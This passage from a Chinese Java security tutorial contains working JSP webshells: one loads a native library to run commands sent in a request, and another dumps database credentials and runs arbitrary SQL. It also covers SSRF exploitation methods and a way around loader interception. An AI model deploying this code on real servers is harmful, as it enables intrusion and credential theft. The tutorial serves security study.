AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAESIAXAAAAAARQF9fX2d4eF9wZXJzb25hbGl0eV92MABRcQCQEkBfX19zdGF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lcgBfX1pOU3QzX18xMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFQzFFdgBfX1pOU3QzX18xMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFcExFUEtjAF9fWk5LU3QzX18xMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFNWNfc3RyRXYAX19fY2xhbmdfY2FsbF90ZXJtaW5hdGUAX19aTlN0M19fMTEyYmFzaWNfc3RyaW5nSWNOU18xMWNoYXJfdHJhaXRzSWNFRU5TXzlhbGxvY2F0b3JJY0VFRUMyRXYAX19aTlN0M19fMTE3X19jb21wcmVzc2VkX3BhaXJJTlNfMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFNV9fcmVwRVM1X0VDMUV2AF9fWk5TdDNfXzExMmJhc2ljX3N0cmluZ0ljTlNfMTFjaGFyX3RyYWl0c0ljRUVOU185YWxsb2NhdG9ySWNFRUU2X196ZXJvRXYAX19aTlN0M19fMTE3X19jb21wcmVzc2VkX3BhaXJJTlNfMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFNV9fcmVwRVM1X0VDMkV2AF9fWk5TdDNfXzEyMl9fY29tcHJlc3NlZF9wYWlyX2VsZW1JTlNfMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFNV9fcmVwRUxpMEVMYjBFRUMyRXYAX19aTlN0M19fMTIyX19jb21wcmVzc2VkX3BhaXJfZWxlbUlOU185YWxsb2NhdG9ySWNFRUxpMUVMYjFFRUMyRXYAX19aTlN0M19fMTlhbGxvY2F0b3JJY0VDMkV2AF9fWk5TdDNfXzExN19fY29tcHJlc3NlZF9wYWlySU5TXzEyYmFzaWNfc3RyaW5nSWNOU18xMWNoYXJfdHJhaXRzSWNFRU5TXzlhbGxvY2F0b3JJY0VFRTVfX3JlcEVTNV9FNWZpcnN0RXYAX19aTlN0M19fMTIyX19jb21wcmVzc2VkX3BhaXJfZWxlbUlOU18xMmJhc2ljX3N0cmluZ0ljTlNfMTFjaGFyX3RyYWl0c0ljRUVOU185YWxsb2NhdG9ySWNFRUU1X19yZXBFTGkwRUxiMEVFNV9fZ2V0RXYAX19aTktTdDNfXzExMmJhc2ljX3N0cmluZ0ljTlNfMTFjaGFyX3RyYWl0c0ljRUVOU185YWxsb2NhdG9ySWNFRUU0ZGF0YUV2AF9fWk5TdDNfXzFMMTZfX3RvX3Jhd19wb2ludGVySUtjRUVQVF9TM18AX19aTktTdDNfXzExMmJhc2ljX3N0cmluZ0ljTlNfMTFjaGFyX3RyYWl0c0ljRUVOU185YWxsb2NhdG9ySWNFRUUxM19fZ2V0X3BvaW50ZXJFdgBfX1pOS1N0M19fMTEyYmFzaWNfc3RyaW5nSWNOU18xMWNoYXJfdHJhaXRzSWNFRU5TXzlhbGxvY2F0b3JJY0VFRTlfX2lzX2xvbmdFdgBfX1pOS1N0M19fMTEyYmFzaWNfc3RyaW5nSWNOU18xMWNoYXJfdHJhaXRzSWNFRU5TXzlhbGxvY2F0b3JJY0VFRTE4X19nZXRfbG9uZ19wb2ludGVyRXYAX19aTktTdDNfXzExMmJhc2ljX3N0cmluZ0ljTlNfMTFjaGFyX3RyYWl0c0ljRUVOU185YWxsb2NhdG9ySWNFRUUxOV9fZ2V0X3Nob3J0X3BvaW50ZXJFdgBfX1pOS1N0M19fMTE3X19jb21wcmVzc2VkX3BhaXJJTlNfMTJiYXNpY19zdHJpbmdJY05TXzExY2hhcl90cmFpdHNJY0VFTlNfOWFsbG9jYXRvckljRUVFNV9fcmVwRVM1X0U1Zmlyc3RFdgBfX1pOS1N0M19fMTIyX19jb21wcmVzc2VkX3BhaXJfZWxlbUlOU18xMmJhc2ljX3N0cmluZ0ljTlNfMTFjaGFyX3RyYWl0c0ljRUVOU185YWxsb2NhdG9ySWNFRUU1X19yZXBFTGkwRUxiMEVFNV9fZ2V0RXYAX19aTlN0M19fMTE0cG9pbnRlcl90cmFpdHNJUEtjRTEwcG9pbnRlcl90b0VSUzFfAF9fWk5TdDNfXzFMOWFkZHJlc3NvZklLY0VFUFRfUlMyXwBHQ0NfZXhjZXB0X3RhYmxlMABfX2R5bGRfcHJpdmF0ZQAA";

    /**
     * 获取JNI链接库目录
     * @return 返回缓存JNI的临时目录
     */
    File getTempJNILibFile() {
        File jniDir = new File(System.getProperty("java.io.tmpdir"), "jni-lib");

        if (!jniDir.exists()) {
            jniDir.mkdir();
        }

        return new File(jniDir, "libcmd.lib");
    }

    /**
     * 高版本JDKsun.misc.BASE64Decoder已经被移除，低版本JDK又没有java.util.Base64对象，
     * 所以还不如直接反射自动找这两个类，哪个存在就用那个decode。
     * @param str
     * @return
     */
    byte[] base64Decode(String str) {
        try {
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (ClassNotFoundException e) {
                Class  clazz   = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 写JNI链接库文件
     * @param base64 JNI动态库Base64
     * @return 返回是否写入成功
     */
    void writeJNILibFile(String base64) throws IOException {
        if (base64 != null) {
            File jniFile = getTempJNILibFile();

            if (!jniFile.exists()) {
                byte[] bytes = base64Decode(base64);

                if (bytes != null) {
                    FileOutputStream fos = new FileOutputStream(jniFile);
                    fos.write(bytes);
                    fos.flush();
                    fos.close();
                }
            }
        }
    }
%>
<%
    // 需要执行的命令
    String cmd = request.getParameter("cmd");

    // JNI链接库字节码,如果不传会使用"COMMAND_JNI_FILE_BYTES"值
    String jniBytes = request.getParameter("jni");

    // JNI路径
    File jniFile = getTempJNILibFile();
    ClassLoader loader = (ClassLoader) application.getAttribute("__LOADER__");

    if (loader == null) {
        loader = new ClassLoader(this.getClass().getClassLoader()) {
            @Override
            protected Class<?> findClass(String name) throws ClassNotFoundException {
                try {
                    return super.findClass(name);
                } catch (ClassNotFoundException e) {
                    return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);
                }
            }
        };

        writeJNILibFile(jniBytes != null ? jniBytes : COMMAND_JNI_FILE_BYTES);// 写JNI文件到临时文件目录

        application.setAttribute("__LOADER__", loader);
    }

    try {
        // load命令执行类
        Class  commandClass = loader.loadClass("com.anbai.sec.cmd.CommandExecution");
        Object loadLib      = application.getAttribute("__LOAD_LIB__");

        if (loadLib == null || !((Boolean) loadLib)) {
            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod("loadLibrary0", Class.class, File.class);
            loadLibrary0Method.setAccessible(true);
            loadLibrary0Method.invoke(loader, commandClass, jniFile);
            application.setAttribute("__LOAD_LIB__", true);
        }

        String content = (String) commandClass.getMethod("exec", String.class).invoke(null, cmd);
        out.println("<pre>");
        out.println(content);
        out.println("</pre>");
    } catch (Exception e) {
        out.println(e.toString());
        throw e;
    }

%>
```

```sh
curl http://localhost:8080/load_library.jsp?cmd=ifconfig -d "jni=urlEncode(base64Encode(jniFile))"
```


## 0x06 JDBC

Java 数据库连接 (Java Database Connectivity， `JDBC`) 是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC 连接数据库的一般步骤:

1. 注册驱动，`Class.forName("数据库驱动类名")`;
2. 获取连接，`DriverManager.getConnection(xxx)`;

```java
String CLASS_NAME = "com.mysql.jdbc.Driver";
String URL = "jdbc:mysql://localhost:3306/mysql"
String USERNAME = "root";
String PASSWORD = "root";

Class.forName(CLASS_NAME); // 注册 JDBC 驱动类
Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
```

关键字搜索：`find 路径 -type f | xargs grep "com.mysql.jdbc.Driver"`。

spring-datasource.jsp:

利用 Spring 的 ApplicationContext 遍历了当前 Web 应用中 Spring 管理的所有的 Bean，然后找出所有 DataSource 的对象，通过反射读取出 C3P0、DBCP、Druid 这三类数据源的数据库配置信息，最后还利用了 DataSource 获取了 Connection 对象实现了数据库查询功能。

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.springframework.context.ApplicationContext" %>
<%@ page import="org.springframework.web.context.support.WebApplicationContextUtils" %>
<%@ page import="javax.sql.DataSource" %>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>
<%@ page import="java.sql.ResultSetMetaData" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<style>
    th, td {
        border: 1px solid #C1DAD7;
        font-size: 12px;
        padding: 6px;
        color: #4f6b72;
    }
</style>
<%!
    // C3PO数据源类
    private static final String C3P0_CLASS_NAME = "com.mchange.v2.c3p0.ComboPooledDataSource";

    // DBCP数据源类
    private static final String DBCP_CLASS_NAME = "org.apache.commons.dbcp.BasicDataSource";

    //Druid数据源类
    private static final String DRUID_CLASS_NAME = "com.alibaba.druid.pool.DruidDataSource";

    /**
     * 获取所有Spring管理的数据源
     * @param ctx Spring上下文
     * @return 数据源数组
     */
    List<DataSource> getDataSources(ApplicationContext ctx) {
        List<DataSource> dataSourceList = new ArrayList<DataSource>();
        String[]         beanNames      = ctx.getBeanDefinitionNames();

        for (String beanName : beanNames) {
            Object object = ctx.getBean(beanName);

            if (object instanceof DataSource) {
                dataSourceList.add((DataSource) object);
            }
        }

        return dataSourceList;
    }

    /**
     * 打印Spring的数据源配置信息,当前只支持DBCP/C3P0/Druid数据源类
     * @param ctx Spring上下文对象
     * @return 数据源配置字符串
     * @throws ClassNotFoundException 数据源类未找到异常
     * @throws NoSuchMethodException 反射调用时方法没找到异常
     * @throws InvocationTargetException 反射调用异常
     * @throws IllegalAccessException 反射调用时不正确的访问异常
     */
    String printDataSourceConfig(ApplicationContext ctx) throws ClassNotFoundException,
            NoSuchMethodException, InvocationTargetException, IllegalAccessException {

        List<DataSource> dataSourceList = getDataSources(ctx);

        for (DataSource dataSource : dataSourceList) {
            String className = dataSource.getClass().getName();
            String url       = null;
            String UserName  = null;
            String PassWord  = null;

            if (C3P0_CLASS_NAME.equals(className)) {
                Class clazz = Class.forName(C3P0_CLASS_NAME);
                url = (String) clazz.getMethod("getJdbcUrl").invoke(dataSource);
                UserName = (String) clazz.getMethod("getUser").invoke(dataSource);
                PassWord = (String) clazz.getMethod("getPassword").invoke(dataSource);
            } else if (DBCP_CLASS_NAME.equals(className)) {
                Class clazz = Class.forName(DBCP_CLASS_NAME);
                url = (String) clazz.getMethod("getUrl").invoke(dataSource);
                UserName = (String) clazz.getMethod("getUsername").invoke(dataSource);
                PassWord = (String) clazz.getMethod("getPassword").invoke(dataSource);
            } else if (DRUID_CLASS_NAME.equals(className)) {
                Class clazz = Class.forName(DRUID_CLASS_NAME);
                url = (String) clazz.getMethod("getUrl").invoke(dataSource);
                UserName = (String) clazz.getMethod("getUsername").invoke(dataSource);
                PassWord = (String) clazz.getMethod("getPassword").invoke(dataSource);
            }

            return "URL:" + url + "<br/>UserName:" + UserName + "<br/>PassWord:" + PassWord + "<br/>";
        }

        return null;
    }
%>
<%
    String sql = request.getParameter("sql");// 定义需要执行的SQL语句

    // 获取Spring的ApplicationContext对象
    ApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(pageContext.getServletContext());

    // 获取Spring中所有的数据源对象
    List<DataSource> dataSourceList = getDataSources(ctx);

    // 检查是否获取到了数据源
    if (dataSourceList == null) {
        out.println("未找到任何数据源配置信息!");
        return;
    }

    out.println("<hr/>");
    out.println("Spring DataSource配置信息获取测试:");
    out.println("<hr/>");
    out.print(printDataSourceConfig(ctx));
    out.println("<hr/>");

    // 定义需要查询的SQL语句
    sql = sql != null ? sql : "select version()";

    for (DataSource dataSource : dataSourceList) {
        out.println("<hr/>");
        out.println("SQL语句:<font color='red'>" + sql + "</font>");
        out.println("<hr/>");

        //从数据源中获取数据库连接对象
        Connection connection = dataSource.getConnection();

        // 创建预编译查询对象
        PreparedStatement pstt = connection.prepareStatement(sql);

        // 执行查询并获取查询结果对象
        ResultSet rs = pstt.executeQuery();

        out.println("<table><tr>");

        // 获取查询结果的元数据对象
        ResultSetMetaData metaData = rs.getMetaData();

        // 从元数据中获取字段信息
        for (int i = 1; i <= metaData.getColumnCount(); i++) {
            out.println("<th>" + metaData.getColumnName(i) + "(" + metaData.getColumnTypeName(i) + ")\t" + "</th>");
        }

        out.println("<tr/>");

        // 获取JDBC查询结果
        while (rs.next()) {
            out.println("<tr>");

            for (int i = 1; i <= metaData.getColumnCount(); i++) {
                out.println("<td>" + rs.getObject(metaData.getColumnName(i)) + "</td>");
            }

            out.println("<tr/>");
        }

        rs.close();
        pstt.close();
    }
%>
```

## 0x07 URLConnection

`URLConnection` 是 Java 中的一个抽象类，是表示应用程序和 URL 之间的通信链接的所有类的超类，类实例可用于读取和写入 URL 引用的资源，可通过 URL 类中的 openConnection 方法获取到 URLConnection 的类对象，其支持的协议可以在 sun.net.www.protocol 中找到:

```
file ftp mailto http https jar netdoc gopher(<=jdk7)
```

Java SSRF 利用方式：

- 利用 file 协议读取文件内容（仅限使用 URLConnection / URL 发起的请求）
- 利用 http 协议进行内网 Web 服务端口探测
- 利用 http 协议对非 Web 服务端口探测需要在异常抛出的情况下(Invalid Http response、Connection reset)
- 利用 http 协议进行 ntlmrelay 攻击，仅限 HttpURLConnection 或者二次包装 HttpURLConnection 并未复写 AuthenticationInfo 方法的对象（默认启用了透明 NTLM 认证 & 跟随跳转）。


## 0x08 JNI

Java 语言基于 C 语言实现，底层很多 API 都是通过 JNI 来实现。JNI 允许 Java 调用 C/C++ 的代码，同时也允许在 C/C++ 中调用 Java 的代码，是介于 Java 层和 Native 层的接口。可以通过 JNI 的方式调用动态链接库，在动态链接库中实现相应的方法。

`native` 关键字说明其修饰的方法是一个原生态方法，方法对应的实现不是在当前文件，而是在用其他语言（C/C++）实现的文件中。Java 语言本身不能对操作系统底层进行访问和操作，但是可以通过 JNI 接口调用其他语言来实现对底层的访问。

1\. 定义 native 方法并编译生成头文件，JNIDemo.java:

```java
package com.ins.z.jni;

public class JNIDemo {
    public static native String exec(String cmd);
}
```

`javac -cp . -h . -d . JNIDemo.java` 编译生成 Class 类文件及 `.h` 头文件，com_ins_z_jni_JNIDemo.h:

```c
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class com_ins_z_jni_JNIDemo */

#ifndef _Included_com_ins_z_jni_JNIDemo
#define _Included_com_ins_z_jni_JNIDemo
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     com_ins_z_jni_JNIDemo
 * Method:    exec
 * Signature: (Ljava/lang/String;)Ljava/lang/String;
 */
JNIEXPORT jstring JNICALL Java_com_ins_z_jni_JNIDemo_exec
  (JNIEnv *env, jclass, jstring);

#ifdef __cplusplus
}
#endif
#endif
```

2\. 编写相应的 c/cpp 文件，编译生成 jni 动态链接库文件。

com_ins_z_jni_JNIDemo.cpp:

```cpp
#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <string>
#include "com_ins_z_jni_JNIDemo.h"

using namespace std;

JNIEXPORT jstring JNICALL Java_com_ins_z_jni_JNIDemo_exec
  (JNIEnv *env, jclass jclass, jstring str) {

    if (str != NULL) {
        jboolean jsCopy;
        // Jstring -> char *
        const char *cmd = env->GetStringUTFChars(str, &jsCopy);

        // 使用 popen 函数执行系统命令
        FILE *fd  = popen(cmd, "r");

        if (fd != NULL) {
            // 返回结果字符串
            string result;

            // 定义字符串数组
            char buf[128];

            // 读取 popen 函数的执行结果
            while (fgets(buf, sizeof(buf), fd) != NULL) {
                // 拼接读取到的结果到 result
                result +=buf;
            }

            // 关闭 popen
            pclose(fd);

            // 返回命令执行结果给 Java, char * -> JString
            return env->NewStringUTF(result.c_str());
        }

    }
    return NULL;
}
```

编译生成 libcmd.jnilib 文件：

```sh
g++ -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/darwin" -shared -o libcmd.jnilib com_ins_z_jni_JNIDemo.cpp
```

3\. 编写命令执行类，重写 findClass() 方法通过反射加载其字节码并调用 exec() ，通过 JNI 加载动态链接库调用其中的命令执行函数。

JNICommandExecution.java:

```java
package com.ins.z.jni;

import java.io.File;
import java.lang.reflect.Method;


public class JNICommandExecution {

    private static final String COMMAND_CLASS_NAME = "com.ins.z.jni.JNIDemo";

    /**
     * JDK 1.5 编译的 com.ins.z.jni.JNIDemo 类字节码,
     * 只有一个 public static native String exec(String cmd); 的方法
     */
    private static final byte[] COMMAND_CLASS_BYTES = new byte[] {
            -54, -2, -70, -66, 0, 0, 0, 55, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 12, 74, 78, 73, 68, 101, 109, 111, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 21, 99, 111, 109, 47, 105, 110, 115, 47, 122, 47, 106, 110, 105, 47, 74, 78, 73, 68, 101, 109, 111, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 1, 9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11
    };

    public static void main(String[] args) {
        String cmd = "ifconfig";
        try {
            ClassLoader loader = new ClassLoader(JNICommandExecution.class.getClassLoader()) {
                @Override
                protected Class<?> findClass(String name) throws ClassNotFoundException {
                    try {
                        return super.findClass(name);
                    } catch (ClassNotFoundException e) {
                        return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);
                    }
                }
            };

            File libPath = new File("/Users/inspringz/Desktop/JavaSecurity/src/libcmd.jnilib");
            Class commandClass = loader.loadClass("com.ins.z.jni.JNIDemo");

            // 可以用 System.load 也加载 lib 也可以用反射 ClassLoader 加载, 如果 loadLibrary0
            // 也被拦截了可以换 java.lang.ClassLoader$NativeLibrary 类的 load 方法。
            // System.load("/Users/inspringz/Desktop/JavaSecurity/src/libcmd.jnilib");
            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod("loadLibrary0", Class.class, File.class);
            loadLibrary0Method.setAccessible(true);
            loadLibrary0Method.invoke(loader, commandClass, libPath);

            String content = (String) commandClass.getMethod("exec", String.class).invoke(null, cmd);
            System.out.println(content);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](/assets/images/move/2021-02-14-22-16-35.png)

## 0x09 动态代理

JDK 提供了 `java.lang.reflect.InvocationHandler` 接口和 `java.lang.reflect.Proxy` 类，这两个类相互配合，提供了一种类动态代理机制，可以通过代理接口实现类来完成程序无侵入式扩展。主要使用场景有：统计方法执行所耗时间、在方法执行前后添加日志、检测方法的参数或返回值、方法访问权限控制、方法 Mock 测试等。

![](/assets/images/move/2021-02-16-17-30-53.png)

> 动态代理 就是在执行代码的过程中，动态生成了 代理类 Class 的字节码 byte[]，然后通过 defineClass0 加载到 JVM 中。

